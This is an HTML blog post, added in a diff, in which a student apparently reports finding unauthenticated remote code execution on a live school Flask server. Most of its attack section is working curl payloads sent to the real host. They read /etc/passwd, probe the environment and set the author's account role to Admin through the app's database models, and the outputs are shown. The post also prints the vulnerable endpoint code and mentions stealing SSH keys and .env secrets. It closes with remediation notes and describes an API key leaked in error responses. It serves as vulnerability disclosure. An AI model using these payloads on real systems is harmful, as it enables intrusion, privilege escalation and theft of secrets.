@@ -1,0 +1,295 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src-attr 'unsafe-inline'">
+
+    <title>Smashing Mort&#x27;s Server for Fun and No Profit 2 | Mataiodoxion</title>
+
+    <link rel="preload" href="https://mataiodoxion.github.io/fonts/FiraCode-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="preload" href="https://mataiodoxion.github.io/fonts/FiraCode-Bold.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://mataiodoxion.github.io/css/style.css?h=287f84ed6c66dca911c6">
+    <link rel="stylesheet" href="https://mataiodoxion.github.io/custom.css?h=d3281feddbb69732b7c5">
+    <script src="https://mataiodoxion.github.io/js/auto-close-popover-on-resize.js?h=4ef87d6fc7b98b22e044" defer></script>
+    <script src="https://mataiodoxion.github.io/js/copy-code-to-clipboard.js?h=b34dc626be3e4c8a0f55" defer></script>
+
+    <link rel="canonical" href="https://mataiodoxion.github.io/blog/smashing-morts-server-2/">
+    
+    <meta name="description" content="Ended up discovering a pretty critical RCE on the deployed server">
+    <meta name="robots" content="index, follow">
+    <meta name="theme-color" content="#211f1a">
+    <meta name="color-scheme" content="dark">
+
+    <meta property="og:title" content="Smashing Mort's Server for Fun and No Profit 2">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://mataiodoxion.github.io/blog/smashing-morts-server-2/">
+    <meta property="og:description" content="Ended up discovering a pretty critical RCE on the deployed server">
+    <meta property="og:site_name" content="Mataiodoxion">
+    <meta property="og:updated_time" content="2026-01-09T03:28:11.328041679+00:00">
+    <meta property="article:published_time" content="2025-12-10T00:00:00+00:00">
+
+</head>
+
+<body class="layout-center" data-theme="terminus">
+    <header class="header">
+        <div class="header-container">
+            <span class="header-logo-container">
+                <a href="https://mataiodoxion.github.io">
+                    <span class="logo">Mataiodoxion</span>
+                </a>
+            </span>
+        </div>
+    </header>
+    <main id="main">
+        <article class="post content">
+            <header>
+                <h1 class="post-title">
+                    <a href="https://mataiodoxion.github.io/blog/smashing-morts-server-2/">Smashing Mort&#x27;s Server for Fun and No Profit 2</a>
+                </h1>
+                <ul class="post-meta hidden">
+                    <li title="Published on 2025-12-10"><time datetime="2025-12-10">2025.12.10</time></li>
+                    <li role="separator" aria-hidden="true">::</li>
+                    <li title="828 words"><time datetime="PT5M">5 min</time> read</li>
+                </ul>
+            </header>
+
+<p>Following the previous post, I had some ideas to try running a new path traversal technique and maybe searching for some other data leakage.</p>
+<h2 id="another-path-traversal">Another Path Traversal?<a class="post-anchor" href="#another-path-traversal" aria-label="Anchor link for: another-path-traversal"><span aria-hidden="true">#</span></a>
+</h2>
+<p>I ended up finding that the method to update <code>uid</code> contained the same flaw in parsing (with both the <code>os.path.join()</code> and the particular setter which allowed for file paths to be inserted):</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># model/user.py
+</span><span>@uid.</span><span style="color:#bf616a;">setter
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">user_id</span><span>(</span><span style="color:#bf616a;">self</span><span>, </span><span style="color:#bf616a;">uid</span><span>):
+</span><span>    </span><span style="color:#bf616a;">self</span><span>._uid = uid
+</span></code></pre>
+<p>To my dismay, however, a check is run on <code>uid</code> to check whether or not it is a valid GitHub ID:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># api/user.py
+</span><span style="color:#65737e;"># check if uid is a GitHub account
+</span><span style="color:#bf616a;">_</span><span>, status = </span><span style="color:#bf616a;">GitHubUser</span><span>().</span><span style="color:#bf616a;">get</span><span>(uid)
+</span><span style="color:#b48ead;">if </span><span>status != </span><span style="color:#d08770;">200</span><span>:
+</span><span>    </span><span style="color:#b48ead;">return </span><span>{&#39;</span><span style="color:#a3be8c;">message</span><span>&#39;: </span><span style="color:#b48ead;">f</span><span>&#39;</span><span style="color:#a3be8c;">User ID </span><span>{uid}</span><span style="color:#a3be8c;"> not a valid GitHub account</span><span>&#39; },
+</span></code></pre>
+<p>and thus:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> PUT http://localhost:8001/api/user \
+</span><span>&gt; -b cookie_regular.txt \
+</span><span>&gt; -H &quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span>&gt; -d &#39;</span><span style="color:#a3be8c;">{ &quot;uid&quot;: &quot;test&quot; }</span><span>&#39;
+</span></code></pre>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{
+</span><span>    &quot;</span><span style="color:#a3be8c;">message</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">User ID test not a valid GitHub account</span><span>&quot;
+</span><span>}
+</span></code></pre>
+<hr />
+<h2 id="the-rce">The RCE<a class="post-anchor" href="#the-rce" aria-label="Anchor link for: the-rce"><span aria-hidden="true">#</span></a>
+</h2>
+<p>While searching for another avenue of exploitation, I came across a function which allows for Python code the be executed with little to no moderation. Quite literally arbitrary code execution.</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># /api/python_exec_api.py
+</span><span style="color:#b48ead;">from </span><span>flask </span><span style="color:#b48ead;">import </span><span>Blueprint, request, jsonify
+</span><span style="color:#b48ead;">from </span><span>flask_restful </span><span style="color:#b48ead;">import </span><span>Api, Resource
+</span><span style="color:#b48ead;">import </span><span>subprocess, tempfile, os
+</span><span>
+</span><span>python_exec_api = </span><span style="color:#bf616a;">Blueprint</span><span>(&#39;</span><span style="color:#a3be8c;">python_exec_api</span><span>&#39;, __name__, </span><span style="color:#bf616a;">url_prefix</span><span>=&#39;</span><span style="color:#a3be8c;">/run</span><span>&#39;)
+</span><span>api = </span><span style="color:#bf616a;">Api</span><span>(python_exec_api)
+</span><span>
+</span><span style="color:#b48ead;">class </span><span style="color:#ebcb8b;">PythonExec</span><span style="color:#eff1f5;">(</span><span style="color:#a3be8c;">Resource</span><span style="color:#eff1f5;">):
+</span><span>    </span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">post</span><span>(</span><span style="color:#bf616a;">self</span><span>):
+</span><span>        </span><span style="color:#65737e;">&quot;&quot;&quot;Executes submitted Python code safely in a short-lived subprocess.&quot;&quot;&quot;
+</span><span>        data = request.</span><span style="color:#bf616a;">get_json</span><span>()
+</span><span>        code = data.</span><span style="color:#bf616a;">get</span><span>(&quot;</span><span style="color:#a3be8c;">code</span><span>&quot;, &quot;&quot;)
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">if </span><span>not code.</span><span style="color:#bf616a;">strip</span><span>():
+</span><span>            </span><span style="color:#b48ead;">return </span><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">⚠️ No code provided.</span><span>&quot;}, </span><span style="color:#d08770;">400
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">with </span><span>tempfile.</span><span style="color:#bf616a;">NamedTemporaryFile</span><span>(</span><span style="color:#bf616a;">delete</span><span>=</span><span style="color:#d08770;">False</span><span>, </span><span style="color:#bf616a;">suffix</span><span>=&quot;</span><span style="color:#a3be8c;">.py</span><span>&quot;) </span><span style="color:#b48ead;">as </span><span>tmp:
+</span><span>            tmp.</span><span style="color:#bf616a;">write</span><span>(code.</span><span style="color:#bf616a;">encode</span><span>())
+</span><span>            tmp.</span><span style="color:#bf616a;">flush</span><span>()
+</span><span>
+</span><span>            </span><span style="color:#b48ead;">try</span><span>:
+</span><span>                result = subprocess.</span><span style="color:#bf616a;">run</span><span>(
+</span><span>                    [&quot;</span><span style="color:#a3be8c;">python3</span><span>&quot;, tmp.name],
+</span><span>                    </span><span style="color:#bf616a;">capture_output</span><span>=</span><span style="color:#d08770;">True</span><span>,
+</span><span>                    </span><span style="color:#bf616a;">text</span><span>=</span><span style="color:#d08770;">True</span><span>,
+</span><span>                    </span><span style="color:#bf616a;">timeout</span><span>=</span><span style="color:#d08770;">5
+</span><span>                )
+</span><span>                output = result.stdout + result.stderr
+</span><span>            </span><span style="color:#b48ead;">except </span><span>subprocess.TimeoutExpired:
+</span><span>                output = &quot;</span><span style="color:#a3be8c;">⏱️ Execution timed out (5 s limit).</span><span>&quot;
+</span><span>            </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
+</span><span>                output = </span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">Error running code: </span><span>{</span><span style="color:#bf616a;">str</span><span>(e)}&quot;
+</span><span>            </span><span style="color:#b48ead;">finally</span><span>:
+</span><span>                os.</span><span style="color:#bf616a;">unlink</span><span>(tmp.name)
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">return </span><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: output}
+</span><span>
+</span><span>api.</span><span style="color:#bf616a;">add_resource</span><span>(PythonExec, &quot;</span><span style="color:#a3be8c;">/python</span><span>&quot;)
+</span></code></pre>
+<p>The endpoint allows <strong>unauthenticated</strong> arbitrary code execution! Huzzah! So, both locally <em>AND</em> online, I can send web requests to execute Python code. Funnily enough, the code (written by a competitor in CyberPatriot -- or rather, written via vibe coding) is effectively a backdoor into any downstream system including this one.</p>
+<p>So, for example, I can grab <code>/etc/passwd</code>:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/run/python \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;code&quot;: &quot;import os; print(os.popen(\&quot;cat /etc/passwd\&quot;).read())&quot;}</span><span>&#39;
+</span></code></pre>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">root:x:0:0:root:/root:/bin/bash</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">sync:x:4:65534:sync:/bin:/bin/sync</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span style="color:#96b5b4;">\n\n</span><span>&quot;}
+</span></code></pre>
+<h3 id="example-of-privilege-escalation">Example of Privilege Escalation<a class="post-anchor" href="#example-of-privilege-escalation" aria-label="Anchor link for: example-of-privilege-escalation"><span aria-hidden="true">#</span></a>
+</h3>
+<p>In trying to find an easy way to do a privilege escalation without modifying the files of the actual server (although I definitely can -- see the demo), I realized you could simply load the actual Flask server's backend functionalities and use it to update my role in the database.</p>
+<p>I first needed to figure out what I was working with, so I found my working directory:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/run/python \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;code&quot;: &quot;import os\nprint(os.getcwd())&quot;}</span><span>&#39;
+</span></code></pre>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">/app</span><span style="color:#96b5b4;">\n</span><span>&quot;}
+</span></code></pre>
+<p>I then gathered some info on the system path to see how Python was being run on the deployed server:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/run/python \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;code&quot;: &quot;import sys\nprint(sys.path)&quot;}</span><span>&#39;
+</span></code></pre>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">[&#39;/tmp&#39;, &#39;/usr/local/lib/python312.zip&#39;, &#39;/usr/local/lib/python3.12&#39;, &#39;/usr/local/lib/python3.12/lib-dynload&#39;, &#39;/usr/local/lib/python3.12/site-packages&#39;]</span><span style="color:#96b5b4;">\n</span><span>&quot;}
+</span></code></pre>
+<p>From there, I can decide where to load the backend functions from, then use that path to try gathering info from the DB (which is the route I took to minimize the destructiveness of this little show).</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/run/python \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;code&quot;: &quot;import sys\nsys.path.insert(0, </span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">/app</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">)\nfrom __init__ import app, db\nfrom model.user import User\nwith app.app_context():\n    u = User.query.filter_by(_uid=</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">mataiodoxion</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">).first()\n    print(u)&quot;}</span><span>&#39;
+</span></code></pre>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">{</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">id</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: &lt;my id&gt;, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">uid</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">mataiodoxion</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">name</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my name&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">email</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my email&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">sid</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my sid&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">role</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">User</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">pfp</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">class</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: [</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">CSP</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">], </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">kasm_server_needed</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: false, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">grade_data</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: {}, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">ap_exam</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: {}, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">password</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my password&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">school</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Del Norte High School</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">sections</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: []}</span><span style="color:#96b5b4;">\n</span><span>&quot;}
+</span></code></pre>
+<p>Here, we've gather my info from the actual DB (redacted for obvious reasons), but the interesting thing to take note of is that fact that my <code>role</code> is currently <code>"User"</code>.</p>
+<p>In the payload, I've loaded the classes I'll be using with</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">import </span><span>sys
+</span><span>sys.path.</span><span style="color:#bf616a;">insert</span><span>(</span><span style="color:#d08770;">0</span><span>, &#39;</span><span style="color:#a3be8c;">/app</span><span>&#39;)
+</span><span style="color:#b48ead;">from </span><span>__init__ </span><span style="color:#b48ead;">import </span><span>app, db
+</span><span style="color:#b48ead;">from </span><span>model.user </span><span style="color:#b48ead;">import </span><span>User
+</span></code></pre>
+<p>After that, it's just a simple use of the <code>User</code> class's functions to perform a SQL query:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">with </span><span>app.</span><span style="color:#bf616a;">app_context</span><span>():
+</span><span>    u = User.query.</span><span style="color:#bf616a;">filter_by</span><span>(</span><span style="color:#bf616a;">_uid</span><span>=&#39;</span><span style="color:#a3be8c;">mataiodoxion</span><span>&#39;).</span><span style="color:#bf616a;">first</span><span>()
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(u) </span><span style="color:#65737e;"># print my data
+</span></code></pre>
+<p>From there, it's simply two additional lines to update my role and commit the changes to the DB:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#c0c5ce;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#bf616a;">curl -X</span><span> POST https://flask.opencodingsociety.com/run/python \
+</span><span style="color:#bf616a;">-H </span><span>&quot;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&quot; \
+</span><span style="color:#bf616a;">-d </span><span>&#39;</span><span style="color:#a3be8c;">{&quot;code&quot;: &quot;import sys\nsys.path.insert(0, </span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">/app</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">)\nfrom __init__ import app, db\nfrom model.user import User\nwith app.app_context():\n    u = User.query.filter_by(_uid=</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">mataiodoxion</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">).first()\n    u.role = </span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">Admin</span><span>&#39;</span><span style="color:#96b5b4;">\&#39;</span><span>&#39;</span><span style="color:#a3be8c;">\n    db.session.commit()\n    print(u)&quot;}</span><span>&#39;
+</span></code></pre>
+<p>Notice the addition of setting the role and saving/closing the session:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>u.role = &quot;</span><span style="color:#a3be8c;">Admin</span><span>&quot;
+</span><span>db.session.</span><span style="color:#bf616a;">commit</span><span>()
+</span></code></pre>
+<p>And with that, I've given myself <code>Admin</code> perms (notice the <code>role</code> field).</p>
+<pre data-lang="json" style="background-color:#2b303b;color:#c0c5ce;" class="language-json "><code class="language-json" data-lang="json"><span>{&quot;</span><span style="color:#a3be8c;">output</span><span>&quot;: &quot;</span><span style="color:#a3be8c;">{</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">id</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: &lt;my id&gt;, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">uid</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">mataiodoxion</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">name</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my name&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">email</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my email&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">sid</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my sid&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">role</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Admin</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">pfp</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">class</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: [</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">CSP</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">], </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">kasm_server_needed</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: false, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">grade_data</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: {}, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">ap_exam</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: {}, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">password</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">&lt;my password&gt;</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">school</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">Del Norte High School</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">, </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">sections</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;">: []}</span><span style="color:#96b5b4;">\n</span><span>&quot;}
+</span></code></pre>
+<p>On the actual live <a href="https://flask.opencodingsociety.com">website</a>, I was able to log in to my now admin account and view/interact with the user and KASM management pages. Great!</p>
+<p>I can also grab ssh keys. I can even grab the <code>.env</code> if I wanted to, which would in theory expose the admin password, recovery passwords, db passwords, API keys, etc. I could also open reverse shells to gain <em>complete</em> access to the server if I wanted to. I can install malware, deface the website, DOS the server... the possibilities are endless.</p>
+<p>In short, I smashed it.</p>
+<h3 id="solutions">Solutions<a class="post-anchor" href="#solutions" aria-label="Anchor link for: solutions"><span aria-hidden="true">#</span></a>
+</h3>
+<p>The best solution, of course, would be to remove the endpoint entirely, but I haven't done much investigation into what (if anything) is even using this endpoint. As of now, the server is completely open to anybody running arbitrary code on the server, so I guess better me find it than some random person online :D</p>
+<p>I'm sure there's likely some way to only permit authenticated people to use the endpoint (and giving that perm to only a few people) with <code>@token_required</code>, but really there's no good way to prevent an RCE with an open endpoint like this. It's also not even immediately clear what is actually using this endpoint so the best option of course would be to <em>scrap it entirely</em> or at least add some sort of containerization if it actually is necessary in any capacity</p>
+<hr />
+<h2 id="exposed-api-keys">Exposed API Keys<a class="post-anchor" href="#exposed-api-keys" aria-label="Anchor link for: exposed-api-keys"><span aria-hidden="true">#</span></a>
+</h2>
+<p>Looking into <code>flask/api/gemini_api.py</code>, we'll see that API keys are exposed in the URL responses:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#65737e;"># api/gemini_api.py
+</span><span style="color:#65737e;"># Build the endpoint url
+</span><span>endpoint = </span><span style="color:#b48ead;">f</span><span>&quot;{server}</span><span style="color:#a3be8c;">?key=</span><span>{api_key}&quot;
+</span></code></pre>
+<p>Thus, whenever an error occurs, th endpoint URL (with the API key) is returned to the client:</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span>error_details = {
+</span><span>    &#39;</span><span style="color:#a3be8c;">status_code</span><span>&#39;: response.status_code,
+</span><span>    &#39;</span><span style="color:#a3be8c;">response_text</span><span>&#39;: response.text,
+</span><span>    &#39;</span><span style="color:#a3be8c;">endpoint</span><span>&#39;: endpoint, </span><span style="color:#65737e;"># api key
+</span><span>    &#39;</span><span style="color:#a3be8c;">headers</span><span>&#39;: </span><span style="color:#bf616a;">dict</span><span>(response.headers)
+</span><span>}
+</span></code></pre>
